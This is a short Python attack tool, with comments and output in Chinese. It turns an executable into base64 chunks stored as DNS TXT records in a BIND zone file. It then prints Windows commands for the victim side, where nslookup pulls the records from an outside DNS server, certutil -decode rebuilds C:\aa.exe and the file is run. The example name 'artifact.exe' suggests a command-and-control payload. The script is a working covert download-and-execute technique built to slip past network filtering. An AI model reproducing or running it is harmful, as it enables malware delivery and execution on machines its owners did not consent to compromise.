import os
import sys


def FileWriteExe():
    os.system("certutil -encode " + sys.argv[1] + " base64.txt")
    with open("base64.txt", "r+") as f1:
        file = f1.read()

    txt_domain_name = ["www0.mydomain.com"]
    num, www_num = 0, 0
    with open("mydomain.com.zone", "w") as f:
        f.write("""$TTL 1D
@       IN SOA  @ rname.invalid. (
                                        0       ; serial
                                        1D      ; refresh
                                        1H      ; retry
                                        1W      ; expire
                                        3H )    ; minimum
        NS      @
        A       127.0.0.1
        AAAA    ::1
www     IN A    1.1.1.1
www0     IN TXT  (""")
        str.count(file, "\n")
        for i in file.split('\n'):
            num += 1
            if num % 900 == 0 and num != 0:
                www_num += 1
                f.write(")\nwww" + str(www_num) + "     IN TXT  (")
                txt_domain_name.append("www" + str(www_num) + ".mydomain.com")
            f.write("\"exec" + i + "\"\n")
        f.write(")")

    print("文件长度 " + str(len(file)))
    print("文件名字 mydomain.com.zone")
    print("文件应存放目录 /var/named/mydomain.com.zone")
    print("请求txt记录域名列表 ", txt_domain_name)
    print(
        """请执行以下命令:\n1. for /l %k in (0,1,""" + str(
            www_num) + """) do (cmd /v:on /Q /c "set a= && set b= && for /f "tokens=*" %i in ('nslookup -qt^=TXT www%k.mydomain.com your_ip ^| findstr "exec"') do (set a=%i && echo !a:~5,-2!)" >>C:\\helo.txt)\n2. certutil -decode C:\helo.txt C:\\aa.exe && cmd /c C:\\aa.exe""")
    print("提示：如果文件较大执行完第一条命令需要等待片刻!")
    os.system("del base64.txt")


if __name__ == '__main__':
    print("usage  :  python3 dnsWriteFile exeFile\nExample:  python3 .\dnsWriteFile.py artifact.exe\n")
    try:
        FileWriteExe()
    except:
        os.system("del base64.txt")
        print("执行失败")